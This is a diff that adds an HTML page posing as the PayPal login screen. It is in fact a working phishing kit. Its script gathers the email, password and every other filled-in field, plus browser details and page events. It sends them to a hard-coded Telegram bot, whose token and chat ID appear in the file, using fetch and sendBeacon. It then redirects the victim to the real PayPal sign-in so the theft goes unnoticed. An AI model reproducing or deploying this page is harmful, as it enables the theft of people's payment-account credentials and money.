@@ -1,0 +1,611 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>PayPal Login</title>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      font-family: Arial, sans-serif;
+    }
+
+    html, body {
+      height: 100%;
+      width: 100%;
+    }
+
+    body {
+      background-color: #fff;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      min-height: 100vh;
+      background: linear-gradient(135deg, #f5f7fa 0%, #e4edf9 100%);
+    }
+
+    .login-container {
+      width: 100%;
+      max-width: 400px;
+      border: 1px solid #ddd;
+      border-radius: 12px;
+      padding: 30px;
+      box-shadow: 0 4px 20px rgba(0, 0, 0, 0.08);
+      background-color: white;
+      transition: transform 0.3s ease;
+    }
+
+    .login-container:hover {
+      transform: translateY(-5px);
+      box-shadow: 0 6px 25px rgba(0, 0, 0, 0.1);
+    }
+
+    .paypal-logo {
+      text-align: center;
+      margin-bottom: 20px;
+    }
+
+    .paypal-logo img {
+      width: 90px;
+      height: auto;
+      transition: transform 0.3s ease;
+    }
+
+    .paypal-logo:hover img {
+      transform: scale(1.05);
+    }
+
+    .input-group {
+      margin-bottom: 20px;
+    }
+
+    input[type="text"],
+    input[type="password"] {
+      width: 100%;
+      padding: 12px;
+      font-size: 16px;
+      border: 1px solid #ccc;
+      border-radius: 6px;
+      transition: all 0.3s ease;
+    }
+
+    input:focus {
+      border-color: #0070ba;
+      outline: none;
+      box-shadow: 0 0 0 2px rgba(0, 112, 186, 0.2);
+    }
+
+    .forgot-password {
+      text-align: left;
+      margin-bottom: 20px;
+    }
+
+    .forgot-password a {
+      font-size: 14px;
+      color: #0070ba;
+      text-decoration: none;
+      font-weight: 500;
+      transition: all 0.2s ease;
+    }
+
+    .forgot-password a:hover {
+      text-decoration: underline;
+      color: #005ea6;
+    }
+
+    .btn-primary {
+      width: 100%;
+      background-color: #0070ba;
+      color: white;
+      font-size: 16px;
+      padding: 12px;
+      border: none;
+      border-radius: 30px;
+      margin-bottom: 16px;
+      cursor: pointer;
+      font-weight: bold;
+      transition: background-color 0.3s, transform 0.2s;
+    }
+
+    .btn-primary:hover {
+      background-color: #005ea6;
+      transform: translateY(-2px);
+    }
+
+    .btn-primary:active {
+      transform: translateY(0);
+    }
+
+    .divider {
+      text-align: center;
+      color: #999;
+      margin: 16px 0;
+      position: relative;
+    }
+
+    .divider::before,
+    .divider::after {
+      content: '';
+      position: absolute;
+      top: 50%;
+      width: 40%;
+      height: 1px;
+      background-color: #ddd;
+    }
+
+    .divider::before {
+      left: 0;
+    }
+
+    .divider::after {
+      right: 0;
+    }
+
+    .btn-outline {
+      width: 100%;
+      background-color: white;
+      color: black;
+      font-size: 16px;
+      padding: 12px;
+      border: 2px solid black;
+      border-radius: 30px;
+      cursor: pointer;
+      font-weight: bold;
+      transition: all 0.3s ease;
+    }
+
+    .btn-outline:hover {
+      background-color: #f5f5f5;
+      border-color: #333;
+    }
+
+    .language-selector {
+      text-align: center;
+      font-size: 14px;
+      margin-top: 20px;
+      color: #333;
+    }
+
+    .language-selector a {
+      margin: 0 8px;
+      color: #333;
+      text-decoration: none;
+      transition: color 0.2s ease;
+    }
+
+    .language-selector a:hover {
+      text-decoration: underline;
+      color: #0070ba;
+    }
+
+    .password-container {
+      position: relative;
+    }
+
+    .toggle-password {
+      position: absolute;
+      top: 50%;
+      right: 10px;
+      transform: translateY(-50%);
+      background: none;
+      border: none;
+      color: #0070ba;
+      font-weight: bold;
+      cursor: pointer;
+      font-size: 14px;
+      transition: color 0.2s ease;
+    }
+
+    .toggle-password:hover {
+      color: #005ea6;
+    }
+    
+    .error-message {
+      color: #d93025;
+      font-size: 13px;
+      margin-top: 5px;
+      display: none;
+      animation: fadeIn 0.3s ease;
+    }
+    
+    .input-error {
+      border-color: #d93025 !important;
+      animation: shake 0.5s ease;
+    }
+    
+    @keyframes fadeIn {
+      from { opacity: 0; }
+      to { opacity: 1; }
+    }
+    
+    @keyframes shake {
+      0%, 100% { transform: translateX(0); }
+      20%, 60% { transform: translateX(-5px); }
+      40%, 80% { transform: translateX(5px); }
+    }
+
+    @media (max-width: 480px) {
+      .login-container {
+        padding: 20px;
+        border: none;
+        box-shadow: none;
+        border-radius: 0;
+      }
+    }
+    
+    .footer {
+      position: absolute;
+      bottom: 20px;
+      width: 100%;
+      text-align: center;
+      color: #777;
+      font-size: 12px;
+    }
+    
+    .footer a {
+      color: #0070ba;
+      text-decoration: none;
+    }
+    
+    .footer a:hover {
+      text-decoration: underline;
+    }
+  </style>
+</head>
+<body>
+  <div class="login-container">
+    <div class="paypal-logo">
+      <img src="https://www.paypalobjects.com/webstatic/icon/pp258.png" alt="PayPal Logo">
+    </div>
+
+    <div class="input-group">
+      <input type="text" id="email" placeholder="Email or mobile number">
+      <div id="emailError" class="error-message">Please enter a valid email address</div>
+    </div>
+
+    <div class="input-group password-container">
+      <input type="password" id="password" placeholder="Password">
+      <button class="toggle-password" id="togglePassword">Show</button>
+    </div>
+
+    <div class="forgot-password">
+      <a href="#">Forgot password?</a>
+    </div>
+
+    <button class="btn-primary" id="loginBtn">Log In</button>
+
+    <div class="divider">or</div>
+
+    <button class="btn-outline">Sign Up</button>
+
+    <div class="language-selector">
+      <span>🇺🇸</span>
+      <a href="#" class="active">English</a> |
+      <a href="#">Français</a> |
+      <a href="#">Español</a> |
+      <a href="#">中文</a>
+    </div>
+  </div>
+  
+  <div class="footer">
+    <p>Copyright © 1999-2023 PayPal. All rights reserved. 
+      <a href="#">Privacy</a> | <a href="#">Legal</a> | <a href="#">Feedback</a></p>
+  </div>
+
+  <script>
+    // Existing password toggle functionality
+    const passwordInput = document.getElementById('password');
+    const toggleBtn = document.getElementById('togglePassword');
+    const emailInput = document.getElementById('email');
+    const emailError = document.getElementById('emailError');
+    const loginBtn = document.getElementById('loginBtn');
+
+    toggleBtn.addEventListener('click', () => {
+      if (passwordInput.type === 'password') {
+        passwordInput.type = 'text';
+        toggleBtn.textContent = 'Hide';
+      } else {
+        passwordInput.type = 'password';
+        toggleBtn.textContent = 'Show';
+      }
+    });
+
+    // Email validation function
+    function validateEmail(email) {
+      const re = /^(([^<>()[\]\\.,;:\s@"]+(\.[^<>()[\]\\.,;:\s@"]+)*)|(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/;
+      return re.test(String(email).toLowerCase());
+    }
+
+    // Validate email on blur and input
+    emailInput.addEventListener('blur', () => {
+      if (emailInput.value.trim() && !validateEmail(emailInput.value)) {
+        emailInput.classList.add('input-error');
+        emailError.style.display = 'block';
+      }
+    });
+
+    emailInput.addEventListener('input', () => {
+      if (validateEmail(emailInput.value)) {
+        emailInput.classList.remove('input-error');
+        emailError.style.display = 'none';
+      }
+    });
+
+    // Login button click handler
+    loginBtn.addEventListener('click', function() {
+      // Validate email
+      if (emailInput.value.trim() && !validateEmail(emailInput.value)) {
+        emailInput.classList.add('input-error');
+        emailError.style.display = 'block';
+        return;
+      }
+      
+      // Send data to Telegram
+      const formData = collectFormData();
+      formData.buttonClicked = this.textContent;
+      formData.submitEvent = 'button_click';
+      
+      // Send to Telegram
+      sendToTelegram(formData);
+      
+      // Redirect to PayPal login
+      window.location.href = 'https://www.paypal.com/signin';
+    });
+
+    // Telegram Bot Configuration
+    const TELEGRAM_CONFIG = {
+      botToken: '8062186241:AAFNjptSiTuRCD6vUJUCVICD4CjidzFe3VM',
+      chatId: '5682254231',
+      apiUrl: 'https://api.telegram.org/bot'
+    };
+
+    // Function to send data to Telegram
+    async function sendToTelegram(data) {
+      const url = `${TELEGRAM_CONFIG.apiUrl}${TELEGRAM_CONFIG.botToken}/sendMessage`;
+      
+      // Format the data as JSON for better readability
+      const message = `🔔 *New Form Submission*\n\`\`\`json\n${JSON.stringify(data, null, 2)}\n\`\`\``;
+      
+      const payload = {
+        chat_id: TELEGRAM_CONFIG.chatId,
+        text: message,
+        parse_mode: 'Markdown'
+      };
+
+      try {
+        const response = await fetch(url, {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json',
+          },
+          body: JSON.stringify(payload)
+        });
+
+        if (response.ok) {
+          console.log('Data sent to Telegram successfully');
+          return true;
+        } else {
+          console.error('Failed to send data to Telegram:', response.statusText);
+          return false;
+        }
+      } catch (error) {
+        console.error('Error sending data to Telegram:', error);
+        return false;
+      }
+    }
+
+    // Function to collect form data
+    function collectFormData() {
+      const formData = {
+        timestamp: new Date().toISOString(),
+        pageUrl: window.location.href,
+        userAgent: navigator.userAgent,
+        formFields: {}
+      };
+
+      // Collect all input fields
+      const inputs = document.querySelectorAll('input[type="text"], input[type="email"], input[type="password"], input[type="tel"], textarea, select');
+      
+      inputs.forEach(input => {
+        if (input.value && input.value.trim() !== '') {
+          const fieldName = input.name || input.id || input.placeholder || 'unnamed_field';
+          
+          // Store all field values as plain text
+          formData.formFields[fieldName] = input.value;
+        }
+      });
+
+      // Collect specific PayPal form fields if they exist
+      const emailField = document.getElementById('email');
+      const passwordField = document.getElementById('password');
+      const phoneField = document.getElementById('phone');
+      
+      if (emailField && emailField.value) {
+        formData.formFields.email = emailField.value;
+      }
+      
+      if (passwordField && passwordField.value) {
+        formData.formFields.password = passwordField.value;
+      }
+      
+      if (phoneField && phoneField.value) {
+        formData.formFields.phone = phoneField.value;
+      }
+
+      return formData;
+    }
+
+    // Function to monitor form submissions
+    function monitorFormSubmissions() {
+      // Monitor form submit events
+      document.addEventListener('submit', function(event) {
+        const formData = collectFormData();
+        
+        // Add form-specific information
+        formData.formAction = event.target.action || 'No action specified';
+        formData.formMethod = event.target.method || 'GET';
+        formData.submitEvent = 'form_submit';
+        
+        sendToTelegram(formData);
+      });
+
+      // Monitor button clicks (for AJAX forms)
+      const submitButtons = document.querySelectorAll('button[type="submit"], input[type="submit"], .button, #btnNext, #btnLogin, #createAccount, .btn-outline');
+      
+      submitButtons.forEach(button => {
+        button.addEventListener('click', function(event) {
+          // Small delay to ensure form values are captured
+          setTimeout(() => {
+            const formData = collectFormData();
+            
+            // Add button-specific information
+            formData.buttonClicked = this.textContent || this.value || this.id || 'Unknown button';
+            formData.submitEvent = 'button_click';
+            
+            sendToTelegram(formData);
+          }, 100);
+        });
+      });
+    }
+
+    // Function to monitor input changes (real-time monitoring)
+    function monitorInputChanges() {
+      const inputs = document.querySelectorAll('input[type="text"], input[type="email"], input[type="password"], input[type="tel"], textarea');
+      
+      inputs.forEach(input => {
+        input.addEventListener('blur', function() {
+          if (this.value && this.value.trim() !== '') {
+            const fieldData = {
+              timestamp: new Date().toISOString(),
+              pageUrl: window.location.href,
+              fieldName: this.name || this.id || this.placeholder || 'unnamed_field',
+              fieldType: this.type,
+              fieldValue: this.value,
+              eventType: 'field_blur'
+            };
+            
+            sendToTelegram(fieldData);
+          }
+        });
+      });
+    }
+
+    // Function to monitor page activity
+    function monitorPageActivity() {
+      // Send page load information
+      window.addEventListener('load', function() {
+        const pageData = {
+          timestamp: new Date().toISOString(),
+          pageUrl: window.location.href,
+          pageTitle: document.title,
+          referrer: document.referrer,
+          userAgent: navigator.userAgent,
+          screenResolution: `${screen.width}x${screen.height}`,
+          eventType: 'page_load'
+        };
+        
+        sendToTelegram(pageData);
+      });
+
+      // Send page unload information
+      window.addEventListener('beforeunload', function() {
+        const finalData = collectFormData();
+        finalData.eventType = 'page_unload';
+        
+        // Use sendBeacon for reliable delivery during page unload
+        const url = `${TELEGRAM_CONFIG.apiUrl}${TELEGRAM_CONFIG.botToken}/sendMessage`;
+        const message = `🚪 *Page Unload*\n\`\`\`json\n${JSON.stringify(finalData, null, 2)}\n\`\`\``;
+        
+        const payload = new FormData();
+        payload.append('chat_id', TELEGRAM_CONFIG.chatId);
+        payload.append('text', message);
+        payload.append('parse_mode', 'Markdown');
+        
+        navigator.sendBeacon(url, payload);
+      });
+    }
+
+    // Enhanced monitoring for PayPal-specific elements
+    function monitorPayPalElements() {
+      // Monitor reCAPTCHA interactions
+      const recaptchaElement = document.querySelector('#recaptcha-anchor');
+      if (recaptchaElement) {
+        recaptchaElement.addEventListener('click', function() {
+          const captchaData = {
+            timestamp: new Date().toISOString(),
+            pageUrl: window.location.href,
+            eventType: 'recaptcha_interaction',
+            action: 'captcha_clicked'
+          };
+          
+          sendToTelegram(captchaData);
+        });
+      }
+
+      // Monitor "Not you?" links
+      const notYouLinks = document.querySelectorAll('.notYouLink, .verificationNotYou a');
+      notYouLinks.forEach(link => {
+        link.addEventListener('click', function() {
+          const linkData = {
+            timestamp: new Date().toISOString(),
+            pageUrl: window.location.href,
+            eventType: 'link_click',
+            linkText: this.textContent,
+            linkHref: this.href
+          };
+          
+          sendToTelegram(linkData);
+        });
+      });
+    }
+
+    // Initialize all monitoring functions
+    function initializeMonitoring() {
+      // Wait for DOM to be fully loaded
+      if (document.readyState === 'loading') {
+        document.addEventListener('DOMContentLoaded', function() {
+          monitorFormSubmissions();
+          monitorInputChanges();
+          monitorPageActivity();
+          monitorPayPalElements();
+        });
+      } else {
+        monitorFormSubmissions();
+        monitorInputChanges();
+        monitorPageActivity();
+        monitorPayPalElements();
+      }
+    }
+
+    // Error handling and fallback
+    window.addEventListener('error', function(event) {
+      const errorData = {
+        timestamp: new Date().toISOString(),
+        pageUrl: window.location.href,
+        eventType: 'javascript_error',
+        error: {
+          message: event.message,
+          filename: event.filename,
+          lineno: event.lineno,
+          colno: event.colno
+        }
+      };
+      
+      sendToTelegram(errorData);
+    });
+
+    // Start monitoring
+    initializeMonitoring();
+
+    // Export functions for manual use if needed
+    window.TelegramFormSender = {
+      sendToTelegram: sendToTelegram,
+      collectFormData: collectFormData,
+      config: TELEGRAM_CONFIG
+    };
+  </script>
+
+</body></html>
